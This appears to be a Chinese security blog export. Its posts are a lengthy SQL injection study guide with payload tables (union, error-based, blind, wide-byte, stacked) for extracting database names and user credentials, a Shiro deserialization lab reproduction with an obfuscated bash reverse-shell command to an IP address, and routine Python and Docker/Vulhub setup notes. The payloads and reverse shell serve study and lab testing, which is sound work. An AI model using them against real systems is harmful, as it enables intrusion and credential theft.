    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>SQL注入学习完毕，按照惯例，进行一波复盘总结，包括探测发现、方法利用。</p>
<p>大致流程：</p>
<p>1、判断换是否有注入漏洞，识别注入点类型</p>
<p>2、获取数据库中的信息</p>
<p>​            获取数据库基本信息（数据库版本、数据库类型、查询列数等）</p>
<p>​            获取数据库库名</p>
<p>​            获取表名</p>
<p>​            获取列名</p>
<p>​            获取用户数据</p>
<p>3、破解加密数据（数据解密）</p>
<p>4、提升权限（配合其他漏洞）</p>
<p>5、内网渗透（配合其他漏洞）</p>
<h1 id="二、SQL注入产生原因"><a href="#二、SQL注入产生原因" class="headerlink" title="二、SQL注入产生原因"></a>二、SQL注入产生原因</h1><p>1、不当的类型处理</p>
<p>2、不安全的数据库配置</p>
<p>3、不合理的查询集处理</p>
<p>4、不当的错误处理</p>
<p>5、转义字符处理不合适</p>
<p>6、多个提交处理不当</p>
<h1 id="三、SQL注入利用前提"><a href="#三、SQL注入利用前提" class="headerlink" title="三、SQL注入利用前提"></a>三、SQL注入利用前提</h1><p>1、用户能控制输入的内容</p>
<p>2、Web应用能把用户输入的内容带入到数据库中执行</p>
<h1 id="四、SQL注入探测与利用（内含思路）"><a href="#四、SQL注入探测与利用（内含思路）" class="headerlink" title="四、SQL注入探测与利用（内含思路）"></a>四、SQL注入探测与利用（内含思路）</h1><p>前面硬邦邦的含义介绍完毕，开始本文干货内容。</p>
<h2 id="1、分类"><a href="#1、分类" class="headerlink" title="1、分类"></a>1、分类</h2><p>在探测前，要了解SQL注入的分类，方便理解。</p>
<table>
<thead>
<tr>
<th>分类方式</th>
<th>类型</th>
<th>判断分类意义</th>
</tr>
</thead>
<tbody><tr>
<td>根据请求方式分类</td>
<td>GET请求注入<br>POST请求注入</td>
<td>调整注入使用的工具</td>
</tr>
<tr>
<td>根据注入点参数分类</td>
<td>字符型注入<br>整数型注入<br>搜索型注入</td>
<td>判断闭合符号</td>
</tr>
<tr>
<td>根据页面反馈结果分类</td>
<td>union注入<br>报错注入<br>布尔盲注<br>时间延时盲注<br>其他类型</td>
<td>调整注入手法</td>
</tr>
<tr>
<td>根据数据库类型分类</td>
<td>MySQL注入<br>SQLServer注入<br>Oracle注入<br>Access注入</td>
<td>调整注入语句</td>
</tr>
<tr>
<td>其他类型</td>
<td>请求头注入<br>内联注入<br>宽字节注入<br>二次编码注入<br>堆叠注入<br>二阶注入</td>
<td>特殊情况特殊对待</td>
</tr>
</tbody></table>
<h2 id="2、探测"><a href="#2、探测" class="headerlink" title="2、探测"></a>2、探测</h2><p>标题三中介绍过，用户能控制输入内容的地方+内容被代入数据库执行（增、查等）多可能存在SQL注入，也是我们需要进行探测的地方。具体点来说，就是url、搜索框、数据包中的数据（可能会被代入数据库的部分，如UA、XFF、POST参数等）。</p>
<p><strong>下面是全文精华所在！思路汇总</strong></p>
<pre class="highlight"><span class="line">使用&#x27;、&quot;、\（单引号双引号斜杠，全加）</span><br><span class="line">页面变化（内容变化、报错等）</span><br><span class="line">	--&gt;使用单个截断符再次判断，若页面返回正常则为字符型注入。（需要用闭合符闭合语句）</span><br><span class="line">	--&gt;页面一直异常，则改为2-1（若原数字为1）,页面返回正常则为整数型注入。（不需要使用闭合符）</span><br><span class="line">	</span><br><span class="line">	再来判断闭合符。（需要结合具体环境分析可能存在的sql语句）</span><br><span class="line">		--&gt;使用让页面异常的符号（\为转义，若有注入必报错，不做判断要求）+若干闭合符（)、%等）+注释符（#、-- ），直至页面返回正		常【注意，#在url中使用需要url编码（%23），--空格使用最好为-- a，避免空格被编码吃掉，空格后可以为任意字符】</span><br><span class="line">		插入：若是在搜索处，需要注意搜索类型，判断基础语句为（%&#x27;and &#x27;%&#x27;=&#x27; 闭合%）</span><br><span class="line">		至此，闭合符判断完毕</span><br><span class="line">	</span><br><span class="line">	使用闭合符+order by 数字+注释符判断数据库列数</span><br><span class="line">		--&gt;二分法判断，使页面正常的最大整数即为数据库列数</span><br><span class="line">		</span><br><span class="line">	尝试注入手法（布尔盲注-union联合查询-报错注入）</span><br><span class="line">	（内联注入-堆叠注入）</span><br><span class="line">	这里为判断尝试优先级</span><br><span class="line">		&gt;&gt;布尔盲注即输入正确时返回数据，不正确时无任何显示。情况较为明显，若有这种情况则有优先进行布尔盲注。</span><br><span class="line">		&gt;&gt;union联合查询为常规手法，需要有显示位。若无显示位再尝试其他方法。</span><br><span class="line">		&gt;&gt;最后是报错注入，使用报错语句手动制造报错信息，多用于页面异常但是不报错的情况。</span><br><span class="line">	其他情况。在上述手法中，可穿插内联注入（使用and、or连接闭合语句，使原来语句依旧执行）、堆叠注入（使用;连接多个语句，全部执	行）【注：内联注入和堆叠注入前提是存在注入】</span><br><span class="line">		</span><br><span class="line">页面无变化（时间延时盲注-宽字节注入-二次编码注入-二阶注入）</span><br><span class="line">	四种方式无书序要求，按照出现概率进行排序</span><br><span class="line">	--&gt;时间延时盲注，利用延时语句判断注入语句是否正确</span><br><span class="line">	--&gt;宽字节注入</span><br><span class="line">	--&gt;二次编码注入</span><br><span class="line">	--&gt;二阶注入通常发生在注册、发表文章等页面，虽然写入的注入语句被防护后写入数据库，但是当再次执行时则会触发。</span><br><span class="line">	--&gt;无注入</span><br><span class="line"></span><br><span class="line">最后还有个文件头注入，这里可以直接对文件头参数进行探测尝试，也可以使用Header Editor插件，对User-Agent、X-Forwarded-For进行编辑，在其后加入判断符，并保持插件开启状态，当存在注入时，自动触发异常。（遇到无变化的情况仍需手测，这里只针对可能被存入数据库的参数进行测试）</span><br></pre>



<h2 id="五、数据库常用语句"><a href="#五、数据库常用语句" class="headerlink" title="五、数据库常用语句"></a>五、数据库常用语句</h2><p>核心查询语句，万变不离其宗</p>
<p>常用命令</p>
<pre class="highlight"><span class="line">show databases;					#显示所有数据库</span><br><span class="line">use dbname;						#选定数默认数据库</span><br><span class="line">show tables;					#显示默认数据库中所有表</span><br><span class="line"></span><br><span class="line">create database db_test;		#创建数据库</span><br><span class="line">use db_test;					#选定数据库</span><br><span class="line">create table tb_test();			#创建表</span><br><span class="line">CREATE TABLE tb_news(</span><br><span class="line">	id INT(10) UNSIGNED UNIQUE AUTO_INCREMENT,</span><br><span class="line">	title VARCHAR(100) NOT NULL,</span><br><span class="line">	author VARCHAR(20) NOT NULL,</span><br><span class="line">	content TEXT NOT NULL,</span><br><span class="line">	addtime TIMESTAMP,</span><br><span class="line">	PRIMARY KEY (id)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">CREATE TABLE tb_users(</span><br><span class="line">	id INT(10) UNSIGNED AUTO_INCREMENT,</span><br><span class="line">	uname VARCHAR(20) NOT NULL,</span><br><span class="line">	upass VARCHAR(50) NOT NULL,</span><br><span class="line">	activeSrc VARCHAR(100) DEFAULT &#x27;image/default.jpg&#x27;,</span><br><span class="line">	email VARCHAR(50) NOT NULL,</span><br><span class="line">	addtime TIMESTAMP,</span><br><span class="line">	PRIMARY KEY (id)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">注：</span><br><span class="line">UNIQUE 值唯一</span><br><span class="line">id属性固定（设置自增长）</span><br><span class="line">KEY属性固定（设定ID为主键）</span><br><span class="line">desc tb_test;						#查看表内容</span><br><span class="line"></span><br><span class="line">insert INTO tb_test (字段) VALUE (&#x27;内容&#x27;);			#新增字段，键值一一对应</span><br><span class="line">insert INTO tb_test (author,title,content) VALUES (&#x27;zs&#x27;,&#x27;title1&#x27;,&#x27;dasdasadadadad&#x27;);</span><br><span class="line"></span><br><span class="line">select * from tb_test where xx;				#查询数据 </span><br><span class="line">* 可替换为指定键</span><br><span class="line">where限定查询范围，查询表达式运算从前往后</span><br><span class="line">xx可以为：&gt;、&lt;、=、like</span><br><span class="line">分别对应数值匹配和字符串匹配，like搭配%使用（%n查询以n结尾的数据）</span><br><span class="line">select * from tb_news where content like &#x27;%n%&#x27;    		#搜索content中包含n的内容</span><br><span class="line">select * from tb_news where addtime &gt; &#x27;2021-06-23 16:48:46&#x27; and (content like &#x27;%8%&#x27; or id &lt; 16);</span><br><span class="line">#搜索范围使用and连接，标识并列，or连接表示或者</span><br><span class="line"></span><br><span class="line">delete										#删除</span><br><span class="line">delete from tb_news;        				#删除表格全部数据</span><br><span class="line">delete from tb_news where id =18;        	#最小删除单位为行    查询限制条件同select</span><br><span class="line"></span><br><span class="line">update										#修改数据</span><br><span class="line">update tb_news set author = &#x27;zs&#x27;, title = &#x27;hello&#x27;;        			#修改全部数据</span><br><span class="line">update tb_news set author = &#x27;zs&#x27;, title = &#x27;hello&#x27; where id=2;    	#修改id=2的指定数据</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">alter table 表名 action								#修改表结构</span><br><span class="line">action可以为：</span><br><span class="line">add 列名 建表语句 [first|afer 列名]  					#为表添加一列，默认列尾添加</span><br><span class="line">add primary key(列名)   								#为表添加主键，已存在主键则报错</span><br><span class="line">modify 列名 &lt;建表语句&gt; [first|after 列名]  			  	#更改列类型和列名称</span><br><span class="line">drop 												#列名   删除一列</span><br><span class="line">rename as 											#新表名    更改表名</span><br><span class="line"></span><br></pre>



<h1 id="六、详细方法"><a href="#六、详细方法" class="headerlink" title="六、详细方法"></a>六、详细方法</h1><p>数据库常用函数</p>
<table>
<thead>
<tr>
<th>函数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>version()</td>
<td>数据库版本号</td>
</tr>
<tr>
<td>database()</td>
<td>当前数据库</td>
</tr>
<tr>
<td>user()</td>
<td>当前用户</td>
</tr>
<tr>
<td>current_user()</td>
<td>当前用户名</td>
</tr>
<tr>
<td>system_user()</td>
<td>系统用户名</td>
</tr>
<tr>
<td>@@datadir</td>
<td>数据库路径</td>
</tr>
<tr>
<td>@@version_compile_os</td>
<td>操作系统版本</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>函数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>limit</td>
<td>限制查询数量，下标从0开始  limit  0,2 从0开始查两个</td>
</tr>
<tr>
<td>length()</td>
<td>计算数据长度</td>
</tr>
<tr>
<td>count()</td>
<td>计算数据行数</td>
</tr>
<tr>
<td>mid(str,1,30)</td>
<td>截取字符串，从1开始截取30位,紧跟要截取的部分，即数据库名、表名、字段名和数据名</td>
</tr>
<tr>
<td>substr(str,0,30)</td>
<td>0为截取初始位，包含整个查询语句</td>
</tr>
<tr>
<td>ascii()</td>
<td>转为ascii码</td>
</tr>
</tbody></table>
<h2 id="1、union联合查询"><a href="#1、union联合查询" class="headerlink" title="1、union联合查询"></a>1、union联合查询</h2><p>判断数据库列数</p>
<p>order by + 数字</p>
<p>报错则用二分法继续判断，直至正常。精确到正常的临界数字，即为列数。</p>
<p>‘ order by 5#</p>
<p>修改2为-2，使默认查询语句结果为空，隐去；这样union select结果即可显示。</p>
<p>然后使用union select联合查,寻找显示位：</p>
<p>id = -2 union select 1,2,3,4；</p>
<p>数据库信息查询</p>
<table>
<thead>
<tr>
<th>操作</th>
<th>语句</th>
</tr>
</thead>
<tbody><tr>
<td>查库名</td>
<td>-1 union select 1,2,database()– a  推荐<br>-1 union select 1,2,(select group_concat(0x7e,(schema_name),0x7e) from information_schema.schemata)– a</td>
</tr>
<tr>
<td>查表名</td>
<td>-1 union select 1,2,(select group_concat(0x7e,(table_name),0x7e) from information_schema.tables where table_schema=’数据库名’)– a</td>
</tr>
<tr>
<td>查字段</td>
<td>-1 union select 1,2,(select group_concat(0x7e,(column_name),0x7e) from information_schema.columns where table_schema=’数据库名’ and table_name=’表名’)– a</td>
</tr>
<tr>
<td>查数据</td>
<td>-1 union select 1,2,(select group_concat(0x7e,(uname,0x7e,pwd),0x7e) from dede_cms.dede_tb)– a</td>
</tr>
</tbody></table>
<p>注意：</p>
<p>1、union select查询列数要与前面列数相同</p>
<p>2、concat()拼接多列结果，group_concat()拼接多行结果。</p>
<p>3、可将查询内容去掉引号，转成16进制形式（前面加上0x）</p>
<p>4、查表时，建议使用database()，既能避免转义，还可以确定当前有效数据库</p>
<h2 id="2、报错注入"><a href="#2、报错注入" class="headerlink" title="2、报错注入"></a>2、报错注入</h2><pre class="highlight"><span class="line">updatexml(arg1,arg2,arg3)  				#查询符合条件的数据	</span><br><span class="line">and updatexml(1,concat(0x5e,(select user()),0x5e),1)</span><br><span class="line">XPATH路径报错	mysql5.1.5及以上版本，输出有32位长度限制</span><br><span class="line">0x5e为^的16进制编码，用于绕过斜杠转义，下同</span><br><span class="line"></span><br><span class="line">extractvalue(arg1,arg2)  				 #同上，两个参数	</span><br><span class="line">and extractvalue(1,concat(0x5e,(select user()),0x5e))</span><br><span class="line">XPATH路径报错	mysql5.1及以上版本,输出有32位长度限制</span><br><span class="line"></span><br><span class="line">floor()  								#返回小于等于该值的最大整数（只返回整数部分）	</span><br><span class="line">and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br><span class="line">floor、count、group by函数冲突报错	mysql5.0及以上版本，user()可变，其他固定</span><br><span class="line"></span><br><span class="line">name_const(name,value) 					#产生一个结果集合列	</span><br><span class="line">and select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))a</span><br><span class="line">列名重复报错	mysql5.0及以下</span><br><span class="line"></span><br><span class="line">exp() 									 #以e为底的指数函数	</span><br><span class="line">and exp(~(select * from (select user()) a))</span><br><span class="line">整形溢出报错	mysql5.5.5及以上版本</span><br><span class="line"></span><br><span class="line">几何函数报错（不满足要求就会报错）	</span><br><span class="line">and multipoint((select * from (select * from (select * from (select version())a)b)c))</span><br><span class="line">geometrycollection()</span><br><span class="line">multipoint()</span><br><span class="line">polygon()</span><br><span class="line">multipolygon()</span><br><span class="line">linestring()</span><br><span class="line">multilinestring()</span><br><span class="line"></span><br><span class="line">用法：</span><br><span class="line">将对应user()等地方替换为要执行的sql语句即可</span><br><span class="line">查数据库名	</span><br><span class="line">id=1&#x27;and updatexml(1,concat(0x7e,(select database()),0x7e),1)    推荐</span><br><span class="line">或id=1&#x27;and updatexml(1,concat(0x7e,(select mid(group_concat(schema_name),1,30) from information_schema.schemata),0x7e),1)</span><br><span class="line"></span><br><span class="line">查表名	</span><br><span class="line">id=1&#x27;and updatexml(1,concat(0x7e,(select mid(group_concat(table_name),1,30) from information_schema.tables where table_schema=&#x27;数据库名&#x27;),0x7e),1)</span><br><span class="line"></span><br><span class="line">查字段	</span><br><span class="line">id=1&#x27;and updatexml(1,concat(0x7e,(select mid(group_concat(column_name),1,30) from information_schema.columns where table_schema=&#x27;数据库名&#x27; and table_name=&#x27;表名&#x27;),0x7e),1)</span><br><span class="line"></span><br><span class="line">查数据	</span><br><span class="line">id=1&#x27;and updatexml(1,concat(0x7e,(select mid(group_concat(username,0x7e,password),1,30) from &#x27;数据库名&#x27;.&#x27;表名&#x27;),0x7e),1)</span><br><span class="line"></span><br></pre>



<h2 id="3、布尔盲注"><a href="#3、布尔盲注" class="headerlink" title="3、布尔盲注"></a>3、布尔盲注</h2><p>条件匹配时返回数据，不匹配时无显示。需要对数据进行猜解（用ascii码进行匹配）</p>
<p>用法：</p>
<p>ascii码二分法</p>
<table>
<thead>
<tr>
<th>说明</th>
<th>语句</th>
</tr>
</thead>
<tbody><tr>
<td>先判断数据长度或个数</td>
<td>and  length((select database())) &gt; 64</td>
</tr>
<tr>
<td>然后进行二分法匹配</td>
<td>and  ascii(mid((select database()),1,1)) &gt;64</td>
</tr>
</tbody></table>
<p>语句如下（省略二分法，直接用=号），n均为前一句获取的长度值</p>
<pre class="highlight"><span class="line">and (length(database()))=8		#获取数据库长度	注意：判断长度不需要转ascii码</span><br><span class="line">	</span><br><span class="line">and ascii((select mid(database(),n,1)))=115 -- a		#获取数据库名</span><br><span class="line"></span><br><span class="line">#获取表长度</span><br><span class="line">and length((select mid((table_name),1,1) from information_schema.tables where table_schema=database()))=30 -- a</span><br><span class="line">	</span><br><span class="line">#获取表名	</span><br><span class="line">and ascii((select mid((table_name),1,1) from information_schema.tables where table_schema=database()))=100 -- a</span><br><span class="line"></span><br><span class="line">#获取字段长度</span><br><span class="line">and length((select mid((column_name),1,1) from information_schema.columns where table_schema=database() and table_name=&#x27;表名&#x27;))=30 -- a</span><br><span class="line"></span><br><span class="line">获取字段名	</span><br><span class="line">and ascii((select mid((column_name),1,1) from information_schema.columns where table_schema=database() and table_name=&#x27;表名&#x27;))=30 -- a</span><br><span class="line"></span><br><span class="line">and length((select mid((username,password),1,1) from database().&#x27;表名&#x27;))=30 -- a		#获取数据长度	</span><br><span class="line"></span><br><span class="line">and ascii((select mid((username,password),1,1) from database().&#x27;表名&#x27;))=30 -- a		#获取字段名	</span><br></pre>



<h2 id="4、时间延时盲注（单双引号页面无变化）"><a href="#4、时间延时盲注（单双引号页面无变化）" class="headerlink" title="4、时间延时盲注（单双引号页面无变化）"></a>4、时间延时盲注（单双引号页面无变化）</h2><p>基于sql盲注，为升级版本</p>
<p>使用’”%判断时，页面无任何变化，尝试判断是否存在时间盲注</p>
<p>判断：</p>
<p>‘“%</p>
<p>‘ and sleep(3) %23</p>
<p>“ and sleep(3))%23</p>
<p>…</p>
<p>方法同判断截断字符</p>
<p>用法：</p>
<table>
<thead>
<tr>
<th>判断函数</th>
<th>语句</th>
</tr>
</thead>
<tbody><tr>
<td>if</td>
<td>select  if(arg1,arg2,arg3)  <br>arg1：判断条件  arg2：条件为真时执行的语句  arg3：条件为假时执行的语句  <br>常用：  and select  if((length(database())&gt;5),sleep(5),1) –a</td>
</tr>
<tr>
<td>case when</td>
<td>select case  when arg1 then arg2 else arg3 end;  <br>arg1：判断条件  arg2：条件为真时执行的语句  arg3：条件为假时执行的语句  <br>常用：  and select  case when ascci(mid(version(),1,1))&gt;64 then sleep(3) end – a</td>
</tr>
</tbody></table>
<p>语句如下（省略二分法，直接用=号）</p>
<table>
<thead>
<tr>
<th>操作</th>
<th>语句</th>
</tr>
</thead>
<tbody><tr>
<td>获取数据库长度</td>
<td>and  if((length(database()))=8),sleep(3),1)            #注意：判断长度不需要转ascii码</td>
</tr>
<tr>
<td>获取数据库名</td>
<td>and  if((ascii((select mid(database(),1,1)))=115),sleep(3),1) – a</td>
</tr>
<tr>
<td>获取表长度</td>
<td>and  if((length((select mid((table_name),1,1) from information_schema.tables where  table_schema=database()))=30),sleep(3),1) – a</td>
</tr>
<tr>
<td>获取表名</td>
<td>and  if((ascii((select mid((table_name),1,1) from information_schema.tables where  table_schema=database()))=100),sleep(3),1) – a</td>
</tr>
<tr>
<td>获取字段长度</td>
<td>and  if((length((select mid((column_name),1,1) from information_schema.columns  where table_schema=database() and table_name=’表名’))=30),sleep(3),1) – a</td>
</tr>
<tr>
<td>获取字段名</td>
<td>and  if((ascii((select mid((column_name),1,1) from information_schema.columns  where table_schema=database() and table_name=’表名’))=30),sleep(3),1) – a</td>
</tr>
<tr>
<td>获取数据长度</td>
<td>and  if((length((select mid((username,password),1,1) from database().’表名’))=30),sleep(3),1) – a</td>
</tr>
<tr>
<td>获取字段名</td>
<td>and  if((ascii((select mid((username,password),1,1) from database().’表名’))=30),sleep(3),1) – a</td>
</tr>
</tbody></table>
<p>sleep可用benchmark代替</p>
<p>benchmark(arg1,arg2)</p>
<p>arg1为执行次数，arg2为执行语句</p>
<p>即执行多少次指定语句，返回执行事件，次数500万次起步，基于cpu质量，延时不稳定</p>
<pre class="highlight"><span class="line">benchmark(5000000,md5(123))  		#执行500万次MD5加密  </span><br></pre>

<p>select if(判断语句,benchmark(5000000,md5(123)),1)</p>
<h2 id="5、请求头注入"><a href="#5、请求头注入" class="headerlink" title="5、请求头注入"></a>5、请求头注入</h2><table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>User-Agent</td>
<td>浏览器版本</td>
</tr>
<tr>
<td>X-Forwarded-For</td>
<td>获取HTTP请求端的真实IP</td>
</tr>
</tbody></table>
<p>使用Header Editor工具修改请求头，在上述两个值后添加单双引号，保持开启状态即可</p>
<p>注意，这里的sql语句大概率为insert，所以可用注入为：</p>
<p>报错注入和bool盲注</p>
<h2 id="6、内联注入"><a href="#6、内联注入" class="headerlink" title="6、内联注入"></a>6、内联注入</h2><p>留言板界面若是存在注入，可用补齐insert语句参数法，</p>
<p>找到留言板的显示位，在显示位上进行sql注入。</p>
<p>这里难点在于插入位数未知、插入类型限制未知，所以位数需要逐个尝试，内容留空。</p>
<p>使用</p>
<p>不用注释，用截断代替，然后使用多个and/or连接</p>
<p>注：前面为true用and；前面为false用or</p>
<pre class="highlight"><span class="line">1、&#x27;firefox&#x27; and &#x27; &#x27;        	#补齐</span><br><span class="line"></span><br><span class="line">2、&#x27;firefox&#x27; and payload and &#x27; &#x27;</span><br></pre>

<p>注：内联注入查询多个表的字段时（特别是有相同名称的字段时），可用select as语句优化语法</p>
<pre class="highlight"><span class="line">1、</span><br><span class="line">SELECT article.title,article.content,user.username FROM article, user</span><br><span class="line">WHERE article.aid=1 AND article.uid=user.uid</span><br><span class="line"></span><br><span class="line">SELECT a.title,a.content,u.username FROM article AS a, user AS u where a.aid=1 and a.uid=u.uid</span><br><span class="line">上述两条语句意思相同，但是select as重命名，简化输入的同时避免歧义</span><br><span class="line"></span><br><span class="line">2、</span><br><span class="line">SELECT userName AS a,userAddress AS b FROM TestTable WHERE a like &#x27;%am%&#x27; </span><br><span class="line">该语句执行是会报错，因为 别名只是对字段的一种引用，不能当作字段一样使用，如果真要把别名当字段一样使用，可以如下变通：</span><br><span class="line">SELECT a, b FROM(SELECT userName AS a,userAddress AS b FROM TestTable) AS tempTable WHERE a like &#x27;%dd%&#x27; </span><br><span class="line">如此，便可把别名当字段一样使用了</span><br><span class="line"></span><br><span class="line">注：as可省略，但不建议</span><br></pre>



<h2 id="7、宽字节注入（单双引号页面无变化）"><a href="#7、宽字节注入（单双引号页面无变化）" class="headerlink" title="7、宽字节注入（单双引号页面无变化）"></a>7、宽字节注入（单双引号页面无变化）</h2><pre class="highlight"><span class="line">mysql语句执行时，现将数据转成16进制，再执行</span><br><span class="line"></span><br><span class="line">GBK为两字节编码方式，编码范围为8140-FEFE（81为页数，40位行列）</span><br><span class="line"></span><br><span class="line">ascii为单字节编码，编码范围为00-7F（斜杠的ascii码为5C）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">当字节数小于81时，会被认为是ascii编码，将转码成ascii码形式；</span><br><span class="line"></span><br><span class="line">当字节数在81-FE之间时，会被认为是gbk编码，会连同后一位一起以gbk形式编码。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">形如abcd（ab为ascii转码的数据，cd为gbk转码的数据）</span><br><span class="line"></span><br><span class="line">原本应解码成两个ascii数据（a、b）和一个gbk数据（cd）</span><br><span class="line"></span><br><span class="line">但是若b的数据大于81，则会被认为是gbk编码的数据，会和c一起解码，</span><br><span class="line"></span><br><span class="line">此时就解码成了两个ascii数据（a、d）和一个gbk编码数据（bc）</span><br></pre>

<p>利用：构造?id=1%df’即可</p>
<p>注意：通常出现在斜杠转义单双引号的网页</p>
<p>%df可以为任何hex码在81-FE之间的数据</p>
<p>宽字节注入存在条件</p>
<p>PHP+Mysql+GBK</p>
<table>
<thead>
<tr>
<th>语句</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>编码语句</td>
<td>mysql_set_charset(“gbk”)<br>mysql_query(“set names gbk”)</td>
</tr>
<tr>
<td>转义语句</td>
<td>addslashes(‘’)<br>mysql_real_escape_string(‘’)</td>
</tr>
</tbody></table>
<p>上述四条语句组合中，除了</p>
<p>mysql_set_charset(“gbk”)+mysql_real_escape_string(‘’)组合，其他组合均存在宽字节注入</p>
<h2 id="8、二次编码注入-单双引号页面无变化"><a href="#8、二次编码注入-单双引号页面无变化" class="headerlink" title="8、二次编码注入(单双引号页面无变化)"></a>8、二次编码注入(单双引号页面无变化)</h2><table>
<thead>
<tr>
<th>正确流程</th>
<th>错误流程（二次编码注入）</th>
</tr>
</thead>
<tbody><tr>
<td>php自动进行一次url解码  网站二次解码  转义单双引号进行防护  写入数据库</td>
<td>php自动解码  转义防护  网站二次解码  urldecode()、rawurldecode()  写入数据库</td>
</tr>
</tbody></table>
<pre class="highlight"><span class="line">单引号二次url编码为：%2527</span><br><span class="line"></span><br><span class="line">双引号二次url编码为：%2522</span><br></pre>

<p>关键字二次编码：hex转码-前缀加%25（%的url编码）</p>
<p>其他：</p>
<p>文件上传时，可通过文件名进行sql注入</p>
<h2 id="9、堆叠注入"><a href="#9、堆叠注入" class="headerlink" title="9、堆叠注入"></a>9、堆叠注入</h2><p>前提：存在sql注入</p>
<p>截断符后使用分号分割，后面注释，中间插入任意sql语句（多个语句用;分割）。不建议使用update、delect等危险语句！</p>
<p>堆叠注入存在场景</p>
<table>
<thead>
<tr>
<th>搭配</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>mssql+asp/php/jsp</td>
<td>堆叠注入</td>
</tr>
<tr>
<td>mysql+php</td>
<td></td>
</tr>
<tr>
<td>mysql_connect()/mysql_query(“select  $id”)</td>
<td>不能堆叠注入</td>
</tr>
<tr>
<td>mysqli_connect()/mysqli_query(“select  $id”)</td>
<td>不能堆叠注入</td>
</tr>
<tr>
<td>mysqli_connect()/multi_query(“select  $id”)</td>
<td>堆叠注入</td>
</tr>
<tr>
<td>new  PDO()/bindvalue(“select ?”) execute($id)</td>
<td>不能注入</td>
</tr>
<tr>
<td>new  PDO()/query(“select $id”)</td>
<td>堆叠注入</td>
</tr>
</tbody></table>
<h2 id="10、二阶注入"><a href="#10、二阶注入" class="headerlink" title="10、二阶注入"></a>10、二阶注入</h2><p>存储在数据库汇总的数据，在使用时发生的注入</p>
<p>在注册用户或者发表文章等写入数据库操作时，加入注入语句，被转义存入数据库</p>
<p>当使用该数据时，被取出，这时注入语句生效</p>
<p>注意：遇到限制是数字类型或者关键字拦截，可进行十六进制编码</p>
<h1 id="七、sql注入防护-修复"><a href="#七、sql注入防护-修复" class="headerlink" title="七、sql注入防护/修复"></a>七、sql注入防护/修复</h1><table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>去掉单引号</td>
<td>现实场景常用单引号，去掉不合实际</td>
</tr>
<tr>
<td>转义单引号</td>
<td>对数字型无效（数字型不需要引号）  斜杠转义  addslashes()函数转义  php.ini配置文件转义（5.6以下版本开启magic_quotes_gpc = On）</td>
</tr>
<tr>
<td>强制类型转换</td>
<td>针对数字型  intval()</td>
</tr>
<tr>
<td>更改数据库连接方式</td>
<td>POD连接数据库将变量转换成字符串，再写入数据库，无法拼接</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Web渗透</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu安装Python3</title>
    <url>/article/Ubuntu%E5%AE%89%E8%A3%85Python3/</url>
    <content><![CDATA[<p>1、卸载旧版python</p>
<pre class="highlight"><span class="line">sudo apt-get remove python</span><br></pre>

<p>2、安装新版python</p>
<pre class="highlight"><span class="line">sudo apt-get install python3</span><br></pre>

<p>3、切换默认python环境</p>
<pre class="highlight"><span class="line">echo alias python=python3 &gt;&gt; ~/.bashrc  #切换python默认版本类型</span><br><span class="line">source ~/.bashrc  						#更新配置文件的命令，只更新当前终端上的配置</span><br></pre>

<p>4、查看默认的python版本</p>
<pre class="highlight"><span class="line">python --version</span><br></pre>

]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Python3</tag>
      </tags>
  </entry>
  <entry>
    <title>Shiro反序列化漏洞复现</title>
    <url>/article/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="1、探测"><a href="#1、探测" class="headerlink" title="1、探测"></a>1、探测</h1><p>在登录界面回包中，有rememberMe=deleteMe参数，说明使用Shiro反序列化。</p>
<h1 id="2、利用"><a href="#2、利用" class="headerlink" title="2、利用"></a>2、利用</h1><p>a、使用shiroExploit工具检测，反弹shell</p>
<pre class="highlight"><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre>

<p>b、使用xray检测，直接发送payload</p>
<pre class="highlight"><span class="line">xray webscan --url &quot;http://&quot; --html-output 1.html</span><br></pre>

<p>或指定脚本检测</p>
<pre class="highlight"><span class="line">xray webscan --url &quot;http://&quot; --plugins shiro --html-output 1.html</span><br></pre>

<p>将发包贴入burpsuite发包，将Testecho: namzzg修改为Testcmd:ls即可执行对应指令，也可反弹shell，语句同上</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Shiro反序列</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu搭建Docker + Vulhub</title>
    <url>/article/Ubuntu%E6%90%AD%E5%BB%BADocker-Vulhub/</url>
    <content><![CDATA[<h1 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h1><p>1、在线安装docker</p>
<pre class="highlight"><span class="line">sudo apt install docker.io -y</span><br><span class="line">docker -v	#查看版本</span><br></pre>

<p>2、安装pip</p>
<pre class="highlight"><span class="line">sudo apt install python3-pip -y</span><br></pre>

<p>3、安装docker-compose</p>
<pre class="highlight"><span class="line">pip3 install docker-compose</span><br><span class="line">docker-compose -v		#查看版本</span><br></pre>

<p>4、拉取vulhub</p>
<pre class="highlight"><span class="line">git clone https://github.com/vulhub/vulhub.git		#在桌面环境</span><br></pre>



